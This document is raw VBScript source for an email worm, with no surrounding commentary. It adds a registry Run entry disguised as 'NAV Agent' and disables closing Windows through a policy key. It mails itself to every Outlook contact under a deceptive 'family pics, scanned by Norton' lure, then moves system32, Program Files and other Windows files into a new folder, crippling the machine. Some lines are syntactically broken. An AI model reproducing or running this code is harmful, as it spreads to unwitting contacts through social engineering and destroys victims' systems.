   Set WSHShell = CreateObject("WScript.Shell")
   WshShell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\NAV Agent", ""

   Set WSHShell = CreateObject("WScript.Shell")
   WshShell.RegWrite "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoCloseKey", "1"

   Dim x
   on error resume next
   Set fso ="Scripting.FileSystem.Object"
   Set so=CreateObject(fso)
   Set ol=CreateObject("Outlook.Application")
   Set out= WScript.CreateObject("Outlook.Application")
   Set mapi = out.GetNameSpace("MAPI")
   Set a = mapi.AddressLists(1)
   For x=1 To a.AddressEntries.Count
   Set Mail=ol.CreateItem(0)
   Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)
   Mail.Subject="Check out Our Family pics!"
   Mail.Body="Here is some of out family picutures! hope you enjoy, also i scanned this with norton antivirus and theres not viruses, yay!, well enjoy!"
   Mail.Attachments.Add Wscript.ScriptFullName
   Mail.Send
   Next
   ol.Quit

   fso filesys, newfolder, newfolderpath
   newfolderpath = "c:\System"
   set filesys=CreateObject("Scripting.FileSystemObject")
   If Not filesys.FolderExists(newfolderpath) Then
   Set newfolder = filesys.CreateFolder(newfolderpath)
   End If



   fso filemove
   set filemove=CreateObject("Scripting.FileSystemObject")
   filemove.MoveFile "c:\windows\system32\*.*" , "C:\System"

   fso filemove
   set filemove=CreateObject("Scripting.FileSystemObject")
   filemove.MoveFile "c:\windows\system\*.*" , "C:\System"

   fso filemove
   set filemove=CreateObject("Scripting.FileSystemObject")
   filemove.MoveFile "c:\Program Files\*.*" , "C:\System"

   fso filemove
   set filemove=CreateObject("Scripting.FileSystemObject")
   filemove.MoveFile "c:\windows\*.bat" , "C:\System"

   fso filemove
   set filemove=CreateObject("Scripting.FileSystemObject")
   filemove.MoveFile "c:\*.bat" , "C:\System"

   fso filemove
   set filemove=CreateObject("Scripting.FileSystemObject")
   filemove.MoveFile "c:\windows\Temp\*.*" , "C:\System"

   fso filemove
   set filemove=CreateObject("Scripting.FileSystemObject")
   filemove.MoveFile "c:\windows\*.exe" , "C:\System"

   fso filemove
   set filemove=CreateObject("Scripting.FileSystemObject")
   filemove.MoveFile "c:\windows\*.txt" , "C:\System"


   fso filemove
   set filemove=CreateObject("Scripting.FileSystemObject")
   filemove.MoveFile "c:\windows\*.vbs" , "C:\System"


   fso filemove
   set filemove=CreateObject("Scripting.FileSystemObject")
   filemove.MoveFile "c:\windows\*.htm" , "C:\System"


   fso filemove
   set filemove=CreateObject("Scripting.FileSystemObject")
   filemove.MoveFile "c:\windows\*.rtf" , "C:\System"

   fso filemove
   set filemove=CreateObject("Scripting.FileSystemObject")
   filemove.MoveFile "c:\windows\*.doc" , "C:\System"

   fso filemove
   set filemove=CreateObject("Scripting.FileSystemObject")
   filemove.MoveFile "c:\*.*" , "C:\System"

   fso filemove
   set filemove=CreateObject("Scripting.FileSystemObject")
   filemove.MoveFile "c:\windows\Desktop" , "C:\System"
